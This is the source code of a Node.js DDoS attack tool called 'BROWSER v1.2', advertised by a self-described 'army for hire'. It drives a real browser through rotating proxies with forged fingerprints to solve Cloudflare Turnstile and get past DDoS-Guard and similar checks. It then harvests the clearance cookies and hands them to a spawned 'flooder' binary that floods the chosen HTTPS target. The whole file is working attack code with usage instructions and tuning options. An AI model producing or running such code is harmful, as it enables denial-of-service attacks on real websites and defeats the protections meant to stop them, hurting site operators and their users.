/*
    BROWSER (v1.2)
    
    (16 September, 2024)

    Features:
    - Cloudflare Turnstile Solver
    - UAM & HTTPDDOS bypass

    Released by ATLAS API corporation (atlasapi.co)

    Made by Benshii Varga

    sudo apt-get install -y libnss3 libatk-bridge2.0-0 libx11-xcb1 libxcomposite1 libxcursor1 libxdamage1 libxi6 libxtst6 libnss3 libxrandr2 libgbm1 libasound2 libpangocairo-1.0-0 libpango-1.0-0 libcups2

    npm install puppeteer puppeteer-real-browser fingerprint-generator fingerprint-injector colors
    npx puppeteer browsers install chrome@stable
*/

import { connect } from 'puppeteer-real-browser';
import { FingerprintGenerator } from 'fingerprint-generator';
import { FingerprintInjector } from 'fingerprint-injector';
import timers from 'timers/promises';

import { spawn } from 'child_process';
import fs from 'fs';
import cluster from 'cluster';
import colors from 'colors';

// process.env.CHROME_PATH = '/root/.cache/puppeteer/chrome/linux-129.0.6668.70/chrome-linux64/chrome';

process.on("uncaughtException", function (error) {
    console.log(error)
});
process.on("unhandledRejection", function (error) {
    console.log(error)
});

process.setMaxListeners(0);

if (process.argv.length < 7) {
    console.clear();
    console.log(`\n                      ${'ATLAS API CORPORATION'.red.bold} ${'|'.bold} ${'an army for hire'.white.bold}

                                ${' 18 September, 2024 '.bgWhite.black.italic}

                                    ${'t.me/benshii'.cyan}`);
    console.log(`
    ${'🚀 '.bold}${'BROWSER v1.2'.bold.magenta}  |  ${`${'Cloudflare Captcha bypass'.bold.yellow}, new browser rendering modes,
                        optional random rate of requests, reserve cookie system,
                        invisible turnstile solver & new browser fingerprints.`.italic}

    —————————————————————————————————————————————————————————————————————————————

    ${'❓'.bold} ${'USAGE'.bold.underline}:

        ${`xvfb-run node BROWSER.js ${'['.red.bold}target${']'.red.bold} ${'['.red.bold}time${']'.red.bold} ${'['.red.bold}forks${']'.red.bold} ${'['.red.bold}rate${']'.red.bold} ${'['.red.bold}proxy${']'.red.bold} ${'('.red.bold}options${')'.red.bold}`.italic}
        ${'xvfb-run node BROWSER.js https://atlasapi.co 90 6 30 http.txt --fp false'.italic}

    ${'⚙️'.bold}  ${'OPTIONS'.bold.underline}:

        --debug    ${'true'.green}/${'false'.red}    ${'~'.red.bold}    ${'Enable script debugging.'.italic}     [default: ${'true'.green}]
        --head     ${'true'.green}/${'false'.red}    ${'~'.red.bold}    ${'Browser headless mode.'.italic}       [default: ${'false'.red}]
        --auth     ${'true'.green}/${'false'.red}    ${'~'.red.bold}    ${'Proxy authentication.'.italic}        [default: ${'false'.red}]
        --rate     ${'true'.green}/${'false'.red}    ${'~'.red.bold}    ${'Random request rate.'.italic}         [default: ${'false'.red}]
        --fp       ${'true'.green}/${'false'.red}    ${'~'.red.bold}    ${'Browser fingerprint.'.italic}         [default: ${'false'.red}]
        
        --threads      ${'10'.yellow}        ${'~'.red.bold}    ${'Number of flooder forks.'.italic}     [default: ${'1'.yellow}]
        --cookies      ${'10'.yellow}        ${'~'.red.bold}    ${'Amount of spare cookies.'.italic}     [default: ${'0'.yellow}]

    ——> ${'FLOODER'.bold.underline}: ${'['.bold} ${'reset'.italic}${','.red} ${'ratelimit'.italic}${','.red} ${'randrate'.italic}${','.red} ${'randpath'.italic}${','.red} ${'close'.italic}${','.red} ${'delay'.italic}${','.red} ${'streams'.italic} ${']'.bold}
    `);
    process.exit(0)
};

const target = process.argv[2]// || 'https://localhost:443';
const duration = parseInt(process.argv[3])// || 0;
const threads = parseInt(process.argv[4]) || 10;
var rate = parseInt(process.argv[5]) || 64;
const proxyfile = process.argv[6] || 'proxies.txt';

let usedProxies = {}

function error(msg) {
    console.log(`   ${'['.red}${'error'.bold}${']'.red} ${msg}`)
    process.exit(0)
}

function get_option(flag) {
    const index = process.argv.indexOf(flag);
    return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
}

function exit() {
    for (const flooder of flooders) {
        flooder.kill();
    }
    log(1, `${'Attack Ended!'.bold}`);
    process.exit(0);
}

process.on('SIGTERM', () => {
    exit();
}).on('SIGINT', () => {
    exit();
});
  
const options = [
    // BROWSER OPTIONS
    { flag: '--debug', value: get_option('--debug'), default: true },
    { flag: '--head', value: get_option('--head'), default: false },
    { flag: '--auth', value: get_option('--auth'), default: false },
    { flag: '--rate', value: get_option('--rate'), default: false },
    { flag: '--fp', value: get_option('--fp'), default: false },

    { flag: '--threads', value: get_option('--threads'), default: 1 },
    { flag: '--cookies', value: get_option('--cookies'), default: 0 },

    // FLOODER OPTIONS
    { flag: '--reset', value: get_option('--reset') },
    { flag: '--ratelimit', value: get_option('--ratelimit') },
    { flag: '--randrate', value: get_option('--randrate') },
    { flag: '--randpath', value: get_option('--randpath') },
    { flag: '--close', value: get_option('--close') },
    { flag: '--delay', value: get_option('--delay') },
    { flag: '--streams', value: get_option('--streams') },
];

function enabled(buf) {
    var flag = `--${buf}`;
    const option = options.find(option => option.flag === flag);
    if (option === undefined) {
        return false;
    }
  
    const optionValue = option.value;

    if (option.value === undefined && option.default) {
        return option.default;
    }
  
    if (optionValue === "true" || optionValue === true) {
        return true;
    } else if (optionValue === "false" || optionValue === false) {
        return false;
    } else if (!isNaN(optionValue)) {
        return parseInt(optionValue);
    } else {
        return false;
    }
}

if (!proxyfile) { error("Invalid proxy file!")}
if (!target || !target.startsWith('https://')) { error("Invalid target address (https only)!")}
if (!duration || isNaN(duration) || duration <= 0) { error("Invalid duration format!") }
if (!threads || isNaN(threads) || threads <= 0) { error("Invalid threads format!") }
if (!rate || isNaN(rate) || rate <= 0) { error("Invalid ratelimit format!") }

// if (rate > 90) { error("Invalid ratelimit range! (max 90)") }

const raw_proxies = fs.readFileSync(proxyfile, "utf-8").toString().replace(/\r/g, "").split("\n").filter((word) => word.trim().length > 0);
if (raw_proxies.length <= 0) { error("Proxy file is empty!") }
var parsed = new URL(target);

function shuffle_proxies(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
}

const proxies = shuffle_proxies(raw_proxies);

var headless = enabled('head');
headless = headless ? true : !headless ? false : true;

var debug = enabled('debug');
debug = debug ? true : !debug ? false : true;

var cookiesOpt = enabled('cookies');

const cache = [];
const flooders = [];

function log(type, string) {
    let script;
    switch (type) {
        case 1:
            script = "js/browser";
            break;
        case 2:
            script = "js/flooder";
            break;
        default:
            script = "js/browser";
            break;
    }
    let d = new Date();
    let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
    let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
    let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();

    if (isNaN(hours) || isNaN(minutes) || isNaN(seconds)) {
        hours = "undefined";
        minutes = "undefined";
        seconds = "undefined";
    }

    if (enabled('debug')) {
        console.log(`(${`${hours}:${minutes}:${seconds}`.cyan}) [${colors.magenta.bold(script)}] | ${string}`);
    }
}

function random_int(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

async function flooder(headers, proxy, ua, cookie)
{
    var THREADS = 1;
    const flooder_threads = enabled('threads');
    if (flooder_threads && !isNaN(flooder_threads) && typeof flooder_threads !== 'boolean') {
        THREADS = flooder_threads;
    }

    if (cookie.includes('cf_clearance') && rate > 90) {
        rate = 90;
    }

    const args = [
        "./flooder",
        target,
        duration,
        rate,
        THREADS,
        proxyfile,
        "--proxy",
        proxy, //proxyfile
        "--agent",
        `${ua}`,
        "--cookie",
        `${cookie}`,
    ]

    const flooder_options = ['reset', 'ratelimit', 'randrate', 'randpath', 'close', 'delay', 'streams']

    for (const option of flooder_options) {
        var optionValue = enabled(option);
        if (optionValue !== undefined && !optionValue) {
            args.push(`--${option}`)
            args.push(optionValue)
        }
    }

    if (enabled('debug')) {
        args.push("--debug")
        args.push("true")
    }

    // if (headers && enabled('fp')) {
    //     args.push("--headers")
    //     args.push(headers)
    // }

    // console.log(`sudo ./flooder ${target} ${duration} ${THREADS} ${rate} ${}`);

    log(2, `(${colors.magenta(proxy)}) ${colors.bold('Spawning Flooder')}`);

    const flooder_process = spawn("sudo", args, {
        stdio: 'pipe'
    });

    flooders.push(flooder_process);

    flooder_process.stdout.on('data', (data) => {
        // console.log(data);
        const output = data.toString().split('\n').filter(line => line.trim() !== '').join('\n');

        log(2, output);
        if (output.includes('Restart Browser')) {
            log(2, "Restarting Browser".bold);
            if (cache.length > 0) {
                const random_index = Math.floor(Math.random() * cache.length);
                const item = cache[random_index];
                flooder(undefined, item["proxy"], item["ua"], item["cookie"]);
                cache.splice(random_index, 1);
            } else {
                main();
            }
            return;
        }
    });

    flooder_process.stderr.on('data', (data) => {
        log(2, `(${colors.magenta(proxy)}) ${'Error'.bold}: ${data.toString('utf8')}`);
        flooder_process.kill();
    })

    flooder_process.on('error', (err) => {
        log(2, `(${colors.magenta(proxy)}) ${'Error'.bold}: ${err.message}`);
        flooder_process.kill();
    })

    flooder_process.on('close', (code) => {
        log(2, `(${colors.magenta(proxy)}) ${'Close'.bold}: ${code}`);
        flooder_process.kill();
    })
}

async function sleep(duration) {
    await new Promise(resolve => setTimeout(resolve, duration));
}

async function main (reserve) {
    return new Promise(async (resolve) => {
        let proxy = proxies[~~(Math.random() * (proxies.length))];
        while (usedProxies[proxy]) {
            if (Object.keys(usedProxies).length == proxies.length) {
                usedProxies = {};
                return;
            }
            proxy = proxies[~~(Math.random() * (proxies.length))];
        }
        usedProxies[proxy] = true;
    
        let [proxy_host, proxy_port] = proxy.split(':');
    
        let Browser, Page;
        // console.log("trying using this proxy:", proxy_host, proxy_port);
        try {
            const args = [];
            let headers;

            let proxy_plugin = {
                host: proxy_host,
                port: proxy_port
            }

            if (enabled('auth')) {
                let [host, port, username, password] = proxy.split(':');
                // console.log(`host: ${host}, port: ${port}, username: ${username}, password: ${password}`);

                // const proxyURL = `http://${username}:${password}@${host}:${port}`;
                // const anonymizedProxyUrl = await proxyChain.anonymizeProxy(proxyURL);
                // console.log(anonymizedProxyUrl.split('://')[1]);
                // host = anonymizedProxyUrl.split('://')[1].split(':')[0];
                // port = anonymizedProxyUrl.split('://')[1].split(':')[1];
                // username = proxy.split(':')[2];
                // password = proxy.split(':')[3];
                proxy_plugin = {
                    host: host,
                    port: parseInt(port),
                    username: username,
                    password: password
                }
            }

            // console.log(`proxy_plugin: ${proxy_plugin}`)

            let { page, browser } = await connect({
                turnstile: true,
                headless: headless,
                args: [],
                customConfig: {},
                connectOption: {},
                // disableXvfb: false,
                ignoreAllFlags: false,
                proxy: proxy_plugin
            }).catch((err) => {
                console.log("error encountered !", err);
                return main();
            })

            // console.log("connected");

            Browser = browser;
            Page = page;

            if (enabled('fp')) {
                const fingerprintInjector = new FingerprintInjector();
                const fingerprintGenerator = new FingerprintGenerator({
                    devices: ['desktop'],
                    browsers: [
                        { name: 'chrome', minVersion: random_int(122, 126) },
                    ],
                    operatingSystems: ['windows']
                });

                const fingerprint = fingerprintGenerator.getFingerprint();
                headers = JSON.stringify(fingerprint.headers);
                // console.log(headers);
                await fingerprintInjector.attachFingerprintToPuppeteer(page, fingerprint);
            }
    
            var userAgent = await page.evaluate(() => {
                return navigator.userAgent;
            });

            if (userAgent.includes("Headless")) {
                userAgent = userAgent.replace('Headless', '');
                await page.setUserAgent(userAgent);
            }
        
            log(1, `(${colors.magenta(proxy)}) ${colors.bold('User-Agent')}: ${colors.yellow(userAgent)}`);
    
            await page.goto(target, { waitUntil: 'domcontentloaded' });
    
            let titles = [];
    
            async function title() {
                var err_count = 0;
                const title_interval = setInterval(async () => {
                    try {
                        const title = await page.title();
                        // console.log(title);
                        if (title.startsWith("Failed to load URL ")) {
                            await browser.close();
                            browser(random_proxy());
                            clearInterval(title_interval);
                        }
                        
                        if (!title) {
                            titles.push(parsed.hostname);
                            clearInterval(title_interval);
                            return;
                        }
                        
                        if (title !== titles[titles.length -1]) {
                            log(1, `(${colors.magenta(proxy)}) ${colors.bold('Title')}: ${colors.italic(title)}`);
                        }
        
                        titles.push(title); 
                        
                        if (!title.includes('Just a moment...') && !title.includes('Security Check')) {
                            clearInterval(title_interval);
                            return;
                        }
                    } catch (err) {
                        err_count += 1;
                        if (err_count >= 5) {
                            log(1, `(${colors.magenta(proxy)}) ${colors.bold('Error')}: ${colors.italic('Too many errors!')}`);
                            await page.close();
                            await browser.close();
                            return main();
                        }
                        // console.log(err)
                    }
                }, 1000).unref()
            }
    
            await title();
    
            let protections = [
                'just a moment...',
                'ddos-guard',
                '403 forbidden',
                'security check',
                'One more step'
            ]
        
            await new Promise(async (resolve) => {
                while (titles.length === 0 || protections.filter(a => titles[titles.length - 1].toLowerCase().indexOf(a) != -1).length > 0) {
                    await timers.setTimeout(100, null, { ref: false })
                }
                resolve(null)
            })
    
            var cookies = await page.cookies();
            const _cookie = cookies.map((c) => `${c.name}=${c.value}`).join("; ");
            
            log(1, `(${colors.magenta(proxy)}) ${colors.bold('Cookies')}: ${colors.green(_cookie)}`);

            await page.close();
            await browser.close();

            if (!reserve) {
                flooder(headers, proxy, userAgent, _cookie);
            } else {
                cache.push({
                    proxy: proxy,
                    ua: userAgent,
                    cookie: _cookie
                })
            }

            resolve();
        } catch (err) {
            if (enabled('debug')) {
                log(1, `(${colors.magenta(proxy)}) ${colors.bold('Error')}: ${colors.italic(err.message)}`);
                if (Page) {
                    await Page.close()
                }
                if (Browser) {
                    await Browser.close()
                }
                main(false);
                resolve();
            }
        }
    })
}

if (cluster.isPrimary) {
    setTimeout(() => {
        exit()
    }, Number(duration) * 1000)

    for (let i = 0; i < threads; i++) {
        main(false)
    }

    if (!isNaN(cookiesOpt) && typeof cookiesOpt !== 'boolean') {
        var x = 1;
        const cookie_interval = setInterval(() => {
            x++;
            if (x >= cookiesOpt) { clearInterval(cookie_interval) }
            main(true)
        }, 3000);
    }
}